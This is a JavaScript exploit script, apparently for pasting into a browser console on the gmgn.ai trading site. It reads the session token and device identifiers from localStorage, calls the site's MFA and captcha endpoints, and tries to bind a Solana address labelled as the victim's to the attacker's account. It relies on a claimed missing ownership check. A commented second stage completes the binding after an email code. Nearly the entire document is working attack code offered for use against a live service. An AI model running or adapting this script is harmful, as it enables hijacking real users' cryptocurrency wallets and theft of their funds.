/**
 * WORKING BIND_WALLET EXPLOIT — Desktop Chrome
 * 
 * CAPTCHA PASSES (code: 0) ✅
 * bind_wallet has NO ownership check ✅
 * Only missing: email OTP verification endpoint
 * 
 * Run on gmgn.ai fresh account (logged in, desktop Chrome)
 */

// STEP 1: Paste this — captcha passes, then needs email OTP
(async()=>{
let tg=JSON.parse(localStorage.getItem('tgInfo'));
let t=tg.token.access_token||Object.values(tg.token).find(v=>typeof v==='string'&&v.length>100);
let p='device_id='+localStorage.getItem('key_device_id')+'&fp_did='+localStorage.getItem('key_fp_did')+'&client_id=gmgn_web_20260715-2161-18d5b10&from_app=gmgn&app_ver=20260715-2161-18d5b10&tz_name=Asia%2FAden&tz_offset=10800&app_lang=en-US&os=web&worker=0';
let h={'Content-Type':'application/json','Authorization':'Bearer '+t};

// Generate bind_wallet txn_id with VICTIM address (NO OWNERSHIP CHECK!)
let r=await(await fetch('/account/account/generate_mfa_params?'+p,{method:'POST',headers:h,body:JSON.stringify({usage:'bind_wallet',biz_params:{address:'5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU',wallet_type:'sol',chain:'sol'}})})).json();
if(r.code!==0){console.log('FAIL:',r.message);return;}
let txn=r.data.data.txn_id;
console.log('verify_items:',JSON.stringify(r.data.data.verify_items));

// Fetch captcha request_id
r=await(await fetch('/account/mfa/txn/v1/fetch_captcha?'+p,{method:'POST',headers:h,body:JSON.stringify({usage:'bind_wallet',txn_id:txn})})).json();
let rid=r.data.request_id;

// Solve reCAPTCHA Enterprise (invisible, auto-passes on desktop)
let c=await new Promise(res=>{grecaptcha.enterprise.ready(async()=>{res(await grecaptcha.enterprise.execute('6Lf3pucqAAAAADbq3czpqDHRAD8j3kC-hcwwDG_T',{action:'bind_wallet'}))})});

// Verify captcha — PASSES on desktop!
r=await(await fetch('/account/mfa/txn/v1/verify_captcha?'+p,{method:'POST',headers:h,body:JSON.stringify({txn_id:txn,request_id:rid,usage:'bind_wallet',captcha_type:'recaptcha_score',captcha_data:c})})).json();
console.log('CAPTCHA:',r.code,r.message);

if(r.code===0){
  console.log('CAPTCHA PASSED! Now need email OTP...');
  // TODO: Find correct endpoint to send email OTP
  // Then verify email and call bind_wallet
  
  // Try bind directly (will show "txn unfinished" proving no ownership check)
  r=await(await fetch('/account/bind_wallet?'+p,{method:'POST',headers:h,body:JSON.stringify({address:'5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU',wallet_type:'sol',chain:'sol',txn_id:txn})})).json();
  console.log('BIND:',r.code,r.message);
  // Expected: -101034 "txn transaction unfinished" (NOT "wallet not owned")
  
  window.__TXN=txn;window.__H=h;window.__P=p;
}
})();

// STEP 2: After finding email OTP endpoint and getting code, paste:
// Replace EMAIL_OTP with your code
/*
(async()=>{
let r=await(await fetch('/account/mfa/txn/v1/verify_email_code?'+window.__P,{method:'POST',headers:window.__H,body:JSON.stringify({txn_id:window.__TXN,usage:'bind_wallet',code:'EMAIL_OTP'})})).json();
console.log('EMAIL:',r.code,r.message);
r=await(await fetch('/account/bind_wallet?'+window.__P,{method:'POST',headers:window.__H,body:JSON.stringify({address:'5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU',wallet_type:'sol',chain:'sol',txn_id:window.__TXN})})).json();
console.log('BIND:',JSON.stringify(r));
})();
*/
